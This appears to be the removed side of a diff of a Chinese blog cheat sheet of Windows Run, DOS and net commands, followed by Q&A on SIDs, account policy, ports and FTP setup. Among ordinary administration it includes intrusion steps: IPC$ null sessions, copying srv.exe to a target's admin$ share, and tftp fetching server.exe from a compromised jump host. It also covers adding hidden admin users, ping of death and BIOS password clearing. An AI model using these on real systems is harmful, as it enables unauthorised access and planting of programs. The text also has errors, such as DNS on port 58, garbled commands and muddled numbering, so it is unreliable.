-<p>\17. dcomcnfg：打开系统组件服务</p>
-<p>\19. devmgmt.msc：设备管理器</p>
-<p>\20. desk.cpl：屏幕分辨率</p>
-<p>\21. dfrgui：优化驱动器 Windows 7→dfrg.msc：磁盘碎片整理程序</p>
-<p>\22. dialer：电话拨号程序</p>
-<p>\23. diskmgmt.msc：磁盘管理</p>
-<p>\24. dvdplay：DVD播放器</p>
-<p>\25. dxdiag：检查DirectX信息</p>
-<p>\26. eudcedit：造字程序</p>
-<p>\27. eventvwr：事件查看器</p>
-<p>\28. explorer：打开资源管理器</p>
-<p>\29. Firewall.cpl：Windows防火墙</p>
-<p>\31. fsmgmt.msc：共享文件夹管理器</p>
-<p>\32. gpedit.msc：组策略</p>
-<p>\33. hdwwiz.cpl：设备管理器</p>
-<p>\34. inetcpl.cpl：Internet属性</p>
-<p>\35. intl.cpl：区域</p>
-<p>\36. iexpress：木马捆绑工具，系统自带</p>
-<p>\37. joy.cpl：游戏控制器</p>
-<p>\38. logoff：注销命令</p>
-<p>\39. lusrmgr.msc：本地用户和组</p>
-<p>\40. lpksetup：语言包安装/删除向导，安装向导会提示下载语言包</p>
-<p>\41. lusrmgr.msc：本机用户和组</p>
-<p>\42. main.cpl：鼠标属性</p>
-<p>\43. mmsys.cpl：声音</p>
-<p>\45. mem.exe：显示内存使用情况（如果直接运行无效，可以先管理员身份运行命令提示符，在命令提示符里输入mem.exe&gt;d:a.txt 即可打开d盘查看a.txt，里面的就是内存使用情况了。当然什么盘什么文件名可自己决定。）</p>
-<p>\47. mmc：打开控制台</p>
-<p>\48. mobsync：同步命令</p>
-<p>\50. Msconfig.exe：系统配置实用程序</p>
-<p>\51. msdt：微软支持诊断工具</p>
-<p>\52. msinfo32：系统信息</p>
-<p>\53. mspaint：画图</p>
-<p>\54. Msra：Windows远程协助</p>
-<p>\55. mstsc：远程桌面连接</p>
-<p>\56. NAPCLCFG.MSC：客户端配置</p>
-<p>\57. ncpa.cpl：网络连接</p>
-<p>\58. narrator：屏幕“讲述人”</p>
-<p>\59. Netplwiz：高级用户帐户控制面板，设置登陆安全相关的选项</p>
-<p>\60. netstat : an(TC)命令检查接口</p>
-<p>\61. notepad：打开记事本</p>
-<p>\62. Nslookup：IP地址侦测器</p>
-<p>\63. odbcad32：ODBC数据源管理器</p>
-<p>\64. OptionalFeatures：打开“打开或关闭Windows功能”对话框</p>
-<p>\65. osk：打开屏幕键盘</p>
-<p>\66. perfmon.msc：计算机性能监测器</p>
-<p>\67. perfmon：计算机性能监测器</p>
-<p>\68. PowerShell：提供强大远程处理能力</p>
-<p>\69. printmanagement.msc：打印管理</p>
-<p>\70. powercfg.cpl：电源选项</p>
-<p>\71. psr：问题步骤记录器</p>
-<p>\72. Rasphone：网络连接</p>
-<p>\73. Recdisc：创建系统修复光盘</p>
-<p>\74. Resmon：资源监视器</p>
-<p>\75. Rstrui：系统还原</p>
-<p>\76. regedit.exe：注册表</p>
-<p>\77. regedt32：注册表编辑器</p>
-<p>\78. rsop.msc：组策略结果集</p>
-<p>\79. sdclt：备份状态与配置，就是查看系统是否已备份</p>
-<p>\80. secpol.msc：本地安全策略</p>
-<p>\81. services.msc：本地服务设置</p>
-<p>\82. sfc /scannow：扫描错误并复原/windows文件保护</p>
-<p>\83. sfc.exe：系统文件检查器</p>
-<p>\84. shrpubw：创建共享文件夹</p>
-<p>\85. sigverif：文件签名验证程序</p>
-<p>\86. slui：Windows激活，查看系统激活信息</p>
-<p>\87. slmgr.vbs -dlv ：显示详细的许可证信息</p>
-<p>　 slmgr.vbs -dli ：显示许可证信息</p>
-<p>　 slmgr.vbs -xpr ：当前许可证截止日期</p>
-<p>　 slmgr.vbs -dti ：显示安装ID 以进行脱机激</p>
-<p>　 slmgr.vbs -ipk ：(Product Key)安装产品密钥</p>
-<p>　 slmgr.vbs -ato ：激活Windows</p>
-<p>　 slmgr.vbs -cpky ：从注册表中清除产品密钥（防止泄露引起的攻击）</p>
-<p>　 slmgr.vbs -ilc ：(License file)安装许可证</p>
-<p>　 slmgr.vbs -upk ：卸载产品密钥</p>
-<p>　 slmgr.vbs -skms ：(name[ort] )批量授权</p>
-<p>\88. snippingtool：截图工具，支持无规则截图</p>
-<p>\89. soundrecorder：录音机，没有录音时间的限制</p>
-<p>\90. StikyNot：便笺</p>
-<p>\91. sysdm.cpl：系统属性</p>
-<p>\92. sysedit：系统配置编辑器</p>
-<p>\93. syskey：系统加密，一旦加密就不能解开，保护系统的双重密码</p>
-<p>\94. taskmgr：任务管理器（旧版）</p>
-<p>\95. TM任务管理器（新版）</p>
-<p>\96. taskschd.msc：任务计划程序</p>
-<p>\97. timedate.cpl：日期和时间</p>
-<p>\98. UserAccountControlSettings用户账户控制设置</p>
-<p>\99. utilman：辅助工具管理器</p>
-<p>\100. wf.msc：高级安全Windows防火墙</p>
-<p>\101. WFS：Windows传真和扫描</p>
-<p>\102. wiaacmgr：扫描仪和照相机向导</p>
-<p>\103. winver：关于Windows</p>
-<p>\104. wmimgmt.msc：打开windows管理体系结构(WMI)</p>
-<p>\105. write：写字板</p>
-<p>\106. wscui.cpl：操作中心</p>
-<p>\107. wscript：windows脚本宿主设置</p>
-<p>\108. wuapp：Windows更新</p>
-<p>　　1. gpedit.msc—–组策略</p>
-<p>　　2. sndrec32——-录音机</p>
-<p>　　3. Nslookup——-IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。</p>
-<p>　　4. explorer——-打开资源管理器</p>
-<p>　　5. logoff———注销命令</p>
-<p>　　6. shutdown——-60秒倒计时关机命令</p>
-<p>　　7. lusrmgr.msc—-本机用户和组</p>
-<p>　　8. services.msc—本地服务设置</p>
-<p>　　9. oobe/msoobe /a—-检查XP是否激活</p>
-<p>　　10. notepad——–打开记事本</p>
-<p>　　11. cleanmgr——-垃圾整理</p>
-<p>　　12. net start messenger—-开始信使服务</p>
-<p>　　13. compmgmt.msc—计算机管理</p>
-<p>　　14. net stop messenger—–停止信使服务</p>
-<p>　　15. conf———–启动netmeeting</p>
-<p>　　16. dvdplay——–DVD播放器</p>
-<p>　　17. charmap——–启动字符映射表</p>
-<p>　　18. diskmgmt.msc—磁盘管理实用程序</p>
-<p>　　19. calc———–启动计算器</p>
-<p>　　20. dfrg.msc——-磁盘碎片整理程序</p>
-<p>　　21. chkdsk.exe—–Chkdsk磁盘检查</p>
-<p>　　22. devmgmt.msc— 设备管理器</p>
-<p>　　23. regsvr32 /u *.dll—-停止dll文件运行</p>
-<p>　　24. drwtsn32—— 系统医生</p>
-<p>　　25. rononce -p—-15秒关机</p>
-<p>　　26. dxdiag———检查DirectX信息</p>
-<p>　　27. regedt32——-注册表编辑器</p>
-<p>　　28. Msconfig.exe—系统配置实用程序</p>
-<p>　　29. rsop.msc——-组策略结果集</p>
-<p>　　30. mem.exe——–显示内存使用情况</p>
-<p>　　31. regedit.exe—-注册表</p>
-<p>　　32. winchat——–XP自带局域网聊天</p>
-<p>　　33. progman——–程序管理器</p>
-<p>　　34. winmsd———系统信息</p>
-<p>　　35. perfmon.msc—-计算机性能监测程序</p>
-<p>　　36. winver———检查Windows版本</p>
-<p>　　37. sfc /scannow—–扫描错误并复原</p>
-<p>　　38. taskmgr—–任务管理器（2000/xp/2003</p>
-<p>　　39. winver———检查Windows版本</p>
-<p>　　40. wmimgmt.msc—-打开windows管理体系结构(WMI)</p>
-<p>　　41. wupdmgr——–windows更新程序</p>
-<p>　　42. wscript——–windows脚本宿主设置</p>
-<p>　　43. write———-写字板</p>
-<p>　　44. winmsd———系统信息</p>
-<p>　　45. wiaacmgr——-扫描仪和照相机向导</p>
-<p>　　46. winchat——–XP自带局域网聊天</p>
-<p>　　47. mem.exe——–显示内存使用情况</p>
-<p>　　48. Msconfig.exe—系统配置实用程序</p>
-<p>　　49. mplayer2——-简易widnows media player</p>
-<p>　　50. mspaint——–画图板</p>
-<p>　　51. mstsc———-远程桌面连接</p>
-<p>　　52. mplayer2——-媒体播放机</p>
-<p>　　53. magnify——–放大镜实用程序</p>
-<p>　　54. mmc————打开控制台</p>
-<p>　　55. mobsync——–同步命令</p>
-<p>　　56. dxdiag———检查DirectX信息</p>
-<p>　　57. iexpress——-木马捆绑工具，系统自带 58. fsmgmt.msc—–共享文件夹管理器</p>
-<p>　　59. utilman——–辅助工具管理器</p>
-<p>　　60. diskmgmt.msc—磁盘管理实用程序</p>
-<p>　　61. dcomcnfg——-打开系统组件服务</p>
-<p>　　62. ddeshare——-打开DDE共享设置</p>
-<p>　　110. osk————打开屏幕键盘</p>
-<p>　　111. odbcad32——-ODBC数据源管理器</p>
-<p>　　112. oobe/msoobe /a—-检查XP是否激活 114. logoff———注销命令</p>
-<p>　　66. notepad——–打开记事本</p>
-<p>　　67. nslookup——-网络管理的工具向导</p>
-<p>　　68. ntbackup——-系统备份和还原</p>
-<p>　　69. narrator——-屏幕“讲述人”</p>
-<p>　　70. ntmsmgr.msc—-移动存储管理器</p>
-<p>　　71. ntmsoprq.msc—移动存储管理员操作请求</p>
-<p>　　72. netstat -an—-(TC)命令检查接口</p>
-<p>　　73. syncapp——–创建一个公文包</p>
-<p>　　74. sysedit——–系统配置编辑器</p>
-<p>　　75. sigverif——-文件签名验证程序</p>
-<p>　　76. ciadv.msc——索引服务程序</p>
-<p>　　77. shrpubw——–创建共享文件夹</p>
-<p>　　78. secpol.msc—–本地安全策略</p>
-<p>　　79. syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码</p>
-<p>　　80. services.msc—本地服务设置</p>
-<p>　　81. Sndvol32——-音量控制程序</p>
-<p>　　82. sfc.exe——–系统文件检查器</p>
-<p>　　83. sfc /scannow—windows文件保护</p>
-<p>　　84. ciadv.msc——索引服务程序</p>
-<p>　　85. tourstart——xp简介（安装完成后出现的漫游xp程序）</p>
-<p>　　86. taskmgr——–任务管理器</p>
-<p>　　87. eventvwr——-事件查看器</p>
-<p>　　88. eudcedit——-造字程序</p>
-<p>　　89. compmgmt.msc—计算机管理</p>
-<p>　　90. packager——-对象包装程序</p>
-<p>　　91. perfmon.msc—-计算机性能监测程序</p>
-<p>　　92. charmap——–启动字符映射表</p>
-<p>　　93. cliconfg——-SQL SERVER 客户端网络实用程序</p>
-<p>　　94. Clipbrd——–剪贴板查看器</p>
-<p>　　95. conf———–启动netmeeting</p>
-<p>　　96. certmgr.msc—-证书管理实用程序</p>
-<p>　　97. regsvr32 /u *.dll—-停止dll文件运行</p>
-<p>　　98. regsvr32 /u zipfldr.dll——取消ZIP支持</p>
-<p>　　99. cmd.exe——–CMD命令提示符</p>
-<p>　　100. chkdsk.exe—–Chkdsk磁盘检查</p>
-<p>1.磁盘操作，</p>
-<p>　　fdisk 隐含 参数 /mbr 重建主引导记录fdisk /mbr 重建主引导记录</p>
-<p>　　fdisk 在DOS7.0以后增加了/cmbr参数，可在挂接多个物理硬盘时，重建排序在后面的硬盘的主引导记录，例如：fdisk /cmbr 2，可重写第二个硬盘的主引导记录。（在使用时要十分小心，避免把好的硬盘引导记录损坏）</p>
-<p>　　format 参数： /q 快速格式化 /u 不可恢复 /autotest 不提示 /s 创建 MS-DOS 引导盘 format c: /q /u /autotest</p>
-<p>2.目录操作</p>
-<p>　　DIR [目录名或文件名] [/S][/W][/P][/A] 列出目录 参数: /s 查找子目录/w 只显示文件名 /p 分页/a 显示隐藏文件 DIR format.exe /s查找该盘的format.exe文件并报告位置</p>
-<p>　　MD (MKDIR) [目录名] 创建目录 MKDIR HELLOWORLD 创建HELLOWORLD目录</p>
-<p>　　CD (CHDIR) [目录名] PS:可以使用相对目录或绝对目录 进入目录 CD AA 进入当前文件夹下的AA目录,cd .. 进入上一个文件夹cd \返回根目录;cd c:\windows 进入c:\windows文件夹</p>
-<p>　　RD ( RMDIR) [目录名] 删除目录 RD HELLOWORLD 删除HELLOWORLD目录</p>
-<p>3.文件操作</p>
-<p>　　删除目录及其文件： rmdir [目录名或文件名] [/S][/W][/P][/A] 。例 rmdir c:\qqdownload/s 删除C盘的qqdownload目录。</p>
-<p>　　del [目录名或文件名] [/f][/s][/q] 删除 参数:/f 删除只读文件/s 删除该目录及其下的所有内容 /q 删除前不确认</p>
-<p>　　del c:\del /s /q 自动删除c盘的del目录。</p>
-<p>　　copy [源文件或目录] [目标目录] 复制文件 copy d:\pwin98*.* c:\presetup 将d盘的pwin98的所有文件复制到c盘的presetup下。</p>
-<p>　　attrib [参数][源文件或目录] 文件属性操作命令，attrib命令可以列出或修改磁盘上文件的属性，文件属性包括文档（A）、只读(R)、隐藏(H)、系统(S)，例如：attrib -h -r -s io.sys 执行这一命令后，将把DOS系统文件io.sys文件的只读、隐藏、系统属性去掉，这时将可以直接通过dir命令看到io.sys文件。attrib +h +r +s autoexec.bat将为自动批处理文件增加以上属性。</p>
-<p>4.内存操作</p>
-<p>　　debug 调试内存 参数 -w [文件名] 写入二进制文件 -o [地址1] [地址2] 输出内存 -q 退出 exp:o 70 10[return] o 71 01</p>
-<p>　　[return] 01[return] q[return] DOS下通过写70h/71h PORT改变BIOS密码在CMOS中存放的对应位置的值,用以清除AWARD BIOS密码.debug 还可以破解硬盘保护卡等,但只可以在纯DOS下用。</p>
-<p>5.分区操作</p>
-<p>　　给磁盘分区，一般都会分成四个区，磁盘分区由主分区、扩展分区、逻辑分区组成。</p>
-<p>　　PQ和Acronis Disk Director这两个工具都可以在不丢失数据的情况下对分区进行调整大小，以及合并等操作，XP系统的话你用PQ，WIN7系统的话用Acronis Disk Director 操作基本一样，可以去网上找教程来看看，再不重装系统的情况下都能调整分区大小，但是建议你还是先备份下数据再调整，毕竟对硬盘直接进行的操作有一定的危险性。</p>
-<p>　　net use ipipc$ “ “ /user:” “ 建立IPC空链接</p>
-<p>　　net use ipipc$ “密码” /user:”用户名” 建立IPC非空链接</p>
-<p>　　net use h: ipc$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:</p>
-<p>　　net use h: ipc$ 登陆后映射对方C：到本地为H:</p>
-<p>　　net use ipipc$ /del 删除IPC链接</p>
-<p>　　net use h: /del 删除映射对方到本地的为H:的映射</p>
-<p>　　net user 用户名　密码　/add 建立用户</p>
-<p>　　net user guest /active:yes 激活guest用户</p>
-<p>　　net user 查看有哪些用户</p>
-<p>　　net user 帐户名 查看帐户的属性</p>
-<p>　　net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限</p>
-<p>　　net start 查看开启了哪些服务</p>
-<p>　　net start 服务名　开启服务；(如:net start telnet， net start schedule)</p>
-<p>　　net stop 服务名 停止某服务</p>
-<p>　　net time 目标ip 查看对方时间</p>
-<p>　　net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息</p>
-<p>　　net view 查看本地局域网内开启了哪些共享</p>
-<p>　　net view ip 查看对方局域网内开启了哪些共享</p>
-<p>　　net config 显示系统网络设置</p>
-<p>　　net logoff 断开连接的共享</p>
-<p>　　net pause 服务名 暂停某服务</p>
-<p>　　net send ip “文本信息” 向对方发信息</p>
-<p>　　net ver 局域网内正在使用的网络连接类型和信息</p>
-<p>　　net share 查看本地开启的共享</p>
-<p>　　net share ipc$ 开启ipc$共享</p>
-<p>　　net share ipc$ /del 删除ipc$共享</p>
-<p>　　net share c$ /del 删除C：共享</p>
-<p>　　net user guest 12345 用guest用户登陆后用将密码改为12345</p>
-<p>　　net password 密码 更改系统登陆密码</p>
-<p>　　netstat -a 查看开启了哪些端口,常用netstat -an</p>
-<p>　　netstat -n 查看端口的网络连接情况，常用netstat -an</p>
-<p>　　netstat -v 查看正在进行的工作</p>
-<p>　　netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况</p>
-<p>　　netstat -s 查看正在使用的所有协议使用情况</p>
-<p>　　nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名</p>
-<p>　　tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。</p>
-<p>　　ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。</p>
-<p>　　ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)</p>
-<p>　　ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息</p>
-<p>　　tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p>
-<p>　　kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p>
-<p>　　del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR <em>.</em>”表示删除当前目录下所有只读文件，“DEL/A-S <em>.</em>”表示删除当前目录下除系统文件以外的所有文件</p>
-<p>　　del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）</p>
-<p>　　move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖</p>
-<p>　　fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令</p>
-<p>　　at id号 开启已注册的某个计划任务</p>
-<p>　　at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止</p>
-<p>　　at id号 /delete 停止某个已注册的计划任务</p>
-<p>　　at 查看所有的计划任务</p>
-<p>　　at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机</p>
-<p>　　finger username @host 查看最近有哪些用户登陆</p>
-<p>　　telnet ip 端口 远和登陆服务器,默认端口为23</p>
-<p>　　open ip 连接到IP（属telnet登陆后的命令）</p>
-<p>　　telnet 在本机上直接键入telnet 将进入本机的telnet</p>
-<p>　　copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件</p>
-<p>　　copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下</p>
-<p>　　copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件</p>
-<p>　　copy ipadmin$svv.exe c: 或:copyipadmin$<em>.</em> 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：</p>
-<p>　　xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件</p>
-<p>　　用参数/e才可连目录下的子目录一起复制到目标地址下。</p>
-<p>　　tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exec:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送</p>
-<p>　　tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机</p>
-<p>　　ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)</p>
-<p>　　route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface</p>
-<p>　　arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息</p>
-<p>　　start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令</p>
-<p>　　mem 查看cpu使用情况</p>
-<p>　　attrib 文件名(目录名) 查看某文件（目录）的属性</p>
-<p>　　attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性</p>
-<p>　　dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间</p>
-<p>　　date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间</p>
-<p>　　set 指定环境变量名称=要指派给变量的字符 设置环境变量</p>
-<p>　　set 显示当前所有的环境变量</p>
-<p>　　set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量</p>
-<p>　　pause 暂停批处理程序，并显示出：请按任意键继续….</p>
-<p>　　if 在批处理程序中执行条件处理（更多说明见if命令及变量）</p>
-<p>　　goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）</p>
-<p>　　call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）</p>
-<p>　　for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）</p>
-<p>　　echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置</p>
-<p>　　echo 信息 在屏幕上显示出信息</p>
-<p>　　echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中</p>
-<p>　　findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello</p>
-<p>　　find 文件名 查找某文件</p>
-<p>　　title 标题名字 更改CMD窗口标题名字</p>
-<p>　　color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白</p>
-<p>　　prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )</p>
-<p>　　ver 在DOS窗口下显示版本信息</p>
-<p>　　winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）</p>
-<p>　　format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS</p>
-<p>　　md　目录名 创建目录</p>
-<p>　　replace 源文件　要替换文件的目录 替换文件</p>
-<p>　　ren 原文件名　新文件名 重命名文件名</p>
-<p>　　tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称</p>
-<p>　　type 文件名 显示文本文件的内容</p>
-<p>　　more 文件名 逐屏显示输出文件</p>
-<p>　　doskey 要锁定的命令=字符</p>
-<p>　　doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=</p>
-<p>　　taskmgr 调出任务管理器</p>
-<p>　　chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误</p>
-<p>　　tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口</p>
-<p>　 exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe</p>
-<p>　　path 路径可执行文件的文件名 为可执行文件设置一个路径。</p>
-<p>　　cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?</p>
-<p>　　regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；</p>
-<p>　　regedit /e 注册表文件名 导出注册表</p>
-<p>　　cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。</p>
-<p>　　cacls 文件名 查看文件的访问用户权限列表</p>
-<p>　　REM 文本内容 在批处理文件中添加注解</p>
-<p>　　netsh 查看或更改本地网络配置情况</p>
-<ol>
-<li>什么是SID?如何查看用户的SID</li>
-</ol>
-<p>答：<strong>什么是**</strong>SID** Windows NT系统使用 SID 来跟踪每个帐户： 如果重命名管理员帐户，计算机仍然知道哪个帐户是管理员帐户。 这是因为 SID 不同于名称，它永远不会更改。例如，您可以重命名计算机上的 Administrator帐户，并且仍将该帐户用作管理员，这是因为 Windows 真正关心的并不是名称是什么；Windows 仍然知道该帐户是 Administrator 帐户，因为无论帐户名称如何变化，SID 保持不变。</p>
-<p><strong>如何查看用户的SID</strong></p>
-<ol>
-<li>按⊞ Win+X。随后会在屏幕的左下角打开Windows“超级用户”菜单。</li>
-<li>单击命令提示符Command Prompt(admin)。随后会显示确认消息</li>
-<li>单击是。随后会显示带有命令提示符的终端窗口。</li>
-</ol>
-<p>\4.  输入WMIC useraccount get name,sid。此命令用于显示系统上所有用户帐户的SID。如果你知道用户名，将命令改为：wmic useraccount where name=”USER” get sid，其中“USER”是实际的用户名。</p>
-<p>\5.  按↵ Enter。用户名右侧的一长串数字就是SID。</p>
-<ol>
-<li>System用户和administrator用户的区别?</li>
-</ol>
-<p>答：SYSTEM 用户和使用普通管理员用户对于文件有同样的特权。可是它们有不同的功能。系统帐户可以由 Windows 下执行的服务和操作系统使用。有很多服务和Windows 进程须要可以在内部登录 （比如在 Windows 安装过程中）而 系统帐户就是为该目的设计的；它是内部帐户，不显示在用户管理器，也无法加入到不论什么组，而且不能分配用户权限。默认情况下，系统帐户授予全然控制 NTFS 卷上的全部文件。在此系统帐户具有作为管理员帐户同样的功能权限。</p>
-<p>而普通管理员账户是不可以在系统内部登录的。对于文件系统，管理员账户和SYSEM账户具有同样的权限。可是对于一些服务和进程，我们须要使用系统账户而非管理员账户，由于这些服务和进程要和系统交互，须要内部登录。</p>
-<p>在运行计划任务的时候，假设我们使用NT AUTHORITY\SYSTEM账户，那么是不须要输入password的。可是使用管理员账户，我们必须输入password。一般我们使用系统账户，主要是为了防止管理员改变password后任务无法运行。对于一般的操作，能够使用不论什么一个账户可是我还是建议您使用管理员或者普通用户运行。假设和进程或者服务有关的话，您能够使用系统账户。</p>
-<p>对于计划任务，假设须要该任务显示的话，必须以眼下登录的用户来运行，否则尽管该任务会运行，可是它仅仅是在后台运行，并不会在前台显示。</p>
-<ol>
-<li>账户锁定时间为0是什么意思?</li>
-</ol>
-<p>答：一直锁定，直到管理员改动设置</p>
-<ol>
-<li>本地安全策略中经典模式的参考模型和仅来宾账户分别是什么意思</li>
-</ol>
-<p>答：参考模型：登录需要用户名和密码</p>
-<p>仅来宾账户：登陆不需要用户和密码，直接以来宾访问</p>
-<ol>
-<li>密码保护的共享是什么意思</li>
-</ol>
-<p>答：禁止密码为空的账户访问</p>
-<ol>
-<li>ftp  dhcp 远程桌面 DNS  web文件共享等服务所使用的端口号分别是什么</li>
-</ol>
-<p>答：FTB（20 21） DHCB（67 68） 远程桌面（3389） DNS（58） WEB（80）</p>
-<ol>
-<li>FTP实现的思路</li>
-</ol>
-<p>答：1. 首先在开始–管理工具–服务器管理器中“添加角色”</p>
-<p>\2. 选择WEB服务器 找到FTB服务器安装</p>
-<p>\3. 安装成功后，点击关闭。接着添加用户，用于ftp的指定用户</p>
-<p>\4. 添加FTB站点</p>
-<p>\5. 设置FTB名称，物理路径，IP地址，身份验证基本，允许访问指定用户，权限读取写入。</p>
-<p>\6. 添加完站点之后，在服务器内部浏览器输入<a href="ftp://localhost后，可以成功弹出登录框，输入用户名密码完成后。" target="_blank" rel="noopener">ftp://localhost后，可以成功弹出登录框，输入用户名密码完成后。</a></p>
-<ol>
-<li>设置FTP服务器时,本地NTFS权限和FTP权限的应用规则</li>
-</ol>
-<p>答：取严格的权限应用，一般将FTP权限设为everyone 完全控制。</p>
-<ol>
-<li>写出命令行访问ftp服务器的所有相关命令</li>
-</ol>
-<p>答：FTP的命令行格式为：ftp -v -d -i -n -g [主机名]，其中</p>
-<p>　　-v显示远程服务器的所有响应信息；</p>
-<p>　　-n限制ftp的自动登录，即不使用；</p>
-<p>　　.n etrc文件；</p>
-<p>　　-d使用调试方式；</p>
-<p>　　-g取消全局文件名。</p>
-<p>　　ftp使用的内部命令如下(中括号表示可选项):</p>
-<p>\1. append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。</p>
-<p>\2. ascii：使用ascii类型传输方式。</p>
-<p>\3. bell：每个命令执行完毕后计算机响铃一次。</p>
-<p>\4. bin（全命令binary）：使用二进制文件传输方式</p>
-<p>\5. bye：退出ftp会话过程</p>
-<p>\6. cd remote-dir：进入远程主机目录。</p>
-<p>\7. close：中断与远程服务器的ftp会话(与open对应)</p>
-<p>\8. delete remote-file：删除远程主机文件。</p>
-<p>\9. debug[debug-value]：设置调试方式，显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。</p>
-<p>\10. dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件local-file。</p>
-<p>\11. disconnection：同close。</p>
-<p>\12. get remote-file[local-file]：将远程主机的文件remote-file传至本地硬盘的local-file。</p>
-<p>\13. glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。</p>
-<p>\14. hash：每传输1024字节，显示一个hash符号(#)</p>
-<p>\15. help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。</p>
-<p>\16. lcd[dir]：将本地工作目录切换至dir。</p>
-<p>17.ls[remote-dir][local-file]：显示远程目录remote-dir，并存入本地文件local-file。</p>
-<p>\18. mdelete[remote-file]：删除远程删除多个主机文件</p>
-<p>\19. mdir remote-files local-file：与dir类似，但可指定多个远程文件，如：mdir <em>.o.</em>.zipoutfile</p>
-<p>\20. mget remote-files：传输多个远程文件。</p>
-<p>\21. mkdir dir-name：在远程主机中建一目录</p>
